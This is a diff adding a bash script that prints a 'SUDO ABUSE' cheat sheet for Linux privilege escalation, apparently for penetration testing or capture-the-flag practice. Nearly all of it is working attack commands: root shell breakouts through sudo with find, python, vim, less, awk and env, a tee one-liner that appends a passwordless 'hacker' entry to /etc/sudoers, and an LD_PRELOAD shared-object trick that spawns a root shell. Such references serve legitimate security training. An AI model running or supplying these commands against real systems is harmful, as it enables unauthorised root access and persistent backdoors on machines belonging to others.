@@ -1,0 +1,65 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── SUDO ABUSE ───────────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enumerate ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}sudo -l${NC}                                            # list allowed sudo commands"
+echo -e "  Note: Look for: (ALL) NOPASSWD: /path/to/binary"
+echo -e "  ${BLUE}https://gtfobins.github.io${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Common Breakouts ─────────────────────────────────${NC}"
+echo -e "  Note: [bash / sh]"
+echo -e "  ${GREEN}sudo bash${NC}"
+echo -e "  ${GREEN}sudo sh${NC}"
+printf "\n"
+echo -e "  Note: [find]"
+echo -e "  ${GREEN}sudo find / -exec /bin/bash \\;${NC}"
+echo -e "  ${GREEN}sudo find / -exec bash -p \\; -quit${NC}"
+printf "\n"
+echo -e "  Note: [python / python3]"
+echo -e "  ${GREEN}sudo python3 -c 'import os; os.system(\"/bin/bash\")'${NC}"
+echo -e "  ${GREEN}sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${NC}"
+printf "\n"
+echo -e "  Note: [vim / vi / nano]"
+echo -e "  ${GREEN}sudo vim -c ':!/bin/bash'${NC}"
+echo -e "  ${GREEN}sudo vim -c ':set shell=/bin/bash' -c ':shell'${NC}"
+echo -e "  Note: In vim: :!/bin/bash  or  :shell"
+echo -e "  Note: In nano: Ctrl+R, Ctrl+X then: reset; sh 1>&0 2>&0"
+printf "\n"
+echo -e "  Note: [less / more]"
+echo -e "  ${GREEN}sudo less /etc/passwd${NC}                              # then press: !bash"
+echo -e "  ${GREEN}sudo more /etc/passwd${NC}                              # then: !bash"
+printf "\n"
+echo -e "  Note: [awk]"
+echo -e "  ${GREEN}sudo awk 'BEGIN {system(\"/bin/bash\")}'${NC}"
+printf "\n"
+echo -e "  Note: [nmap (old)]"
+echo -e "  ${GREEN}sudo nmap --interactive${NC}                            # then: !sh"
+printf "\n"
+echo -e "  Note: [env]"
+echo -e "  ${GREEN}sudo env /bin/bash${NC}"
+printf "\n"
+echo -e "  Note: [tee - write files as root]"
+echo -e "  ${GREEN}echo 'hacker ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── LD_PRELOAD Trick ─────────────────────────────────${NC}"
+echo -e "  Note: Requires: env_keep += LD_PRELOAD in sudoers"
+echo -e "  ${GREEN}cat > /tmp/evil.c << 'EOF'${NC}"
+echo -e "  ${GREEN}void _init() { setgid(0); setuid(0); system(\"/bin/bash\"); }${NC}"
+echo -e "  ${GREEN}EOF${NC}"
+echo -e "  ${GREEN}gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles${NC}"
+echo -e "  ${GREEN}sudo LD_PRELOAD=/tmp/evil.so <any_allowed_binary>${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
